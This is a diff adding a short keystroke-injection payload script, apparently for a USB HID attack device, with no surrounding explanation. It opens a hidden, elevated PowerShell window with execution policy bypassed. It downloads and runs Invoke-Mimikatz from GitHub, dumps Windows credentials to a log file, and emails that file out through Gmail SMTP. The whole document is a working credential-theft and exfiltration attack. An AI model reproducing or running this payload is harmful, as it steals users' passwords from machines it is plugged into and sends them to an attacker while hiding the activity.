@@ -1,0 +1,9 @@
+Press:131+114
+DELAY
+Print:powershell -NoP -NonI -W Hidden -Exec Bypass "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=18' -Verb runAs"
+Press:176
+Press:130+121
+Print:powershell -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/7a39a55f127b1aeb951b3d9d80c6dc64500cacb5/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-mimikatz -DumpCreds | Out-File C:\\pwlog.txt -Append"
+Press:176
+Print:powershell -c "$msg = new-object Net.Mail.MailMessage; $smtp = new-object Net.Mail.SmtpClient('smtp.gmail.com'); $smtp.EnableSsl = $true; $msg.From = 'xxxx@gmail.com'; $msg.To.Add('xxxx@gmail.com'); $msg.SubjectEncoding = [system.Text.Encoding]::Unicode; $msg.Subject = 'Test mail from PS'; $msg.Body = 'Test mail from PS '; $msg.Attachments.Add('c:\\\\pwlog.txt'); $smtp.Credentials = New-Object System.Net.NetworkCredential('xxxx@gmail.com', 'xxxxx');$smtp.Send($msg)" & exit
+Press:176
